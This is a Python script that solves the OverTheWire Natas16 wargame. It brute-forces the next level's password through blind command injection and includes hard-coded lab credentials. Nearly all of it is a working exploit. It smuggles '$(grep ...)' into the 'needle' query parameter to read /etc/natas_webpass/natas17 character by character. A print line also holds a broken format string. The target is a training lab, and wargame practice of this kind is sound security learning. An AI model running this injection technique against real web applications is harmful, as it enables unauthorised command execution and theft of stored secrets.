#! /bin/python
import requests, string
url = "http://natas16.natas.labs.overthewire.org"
username = "natas16"
password = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
characters = ''.join([string.digits, string.ascii_letters])
passchar = []
exists_str = "This user exists"

for c in characters:
    query = '/?needle=brute$(grep ' + c + ' /etc/natas_webpass/natas17)'
    uri = url+query
    r = requests.get(uri, auth=(username, password))
    if 'brute' not in r.text:
        passchar.append(c)
        print("> {0}".format(''.join(passchar)))
print("Character List: {0}".format(''.join(passchar)))


secret =''
for place in range(1,33):
    print ("Character# <1".format(str(place)))
    for char in passchar:
        temp = ''.join([secret,char])
        query = '/?needle=brute$(grep ^' + temp + ' /etc/natas_webpass/natas17)'
        uri = url+query
        r = requests.get(uri, auth=(username, password))
        if 'brute' not in r.text:
            secret += char
            print("Password : {}".format(secret))
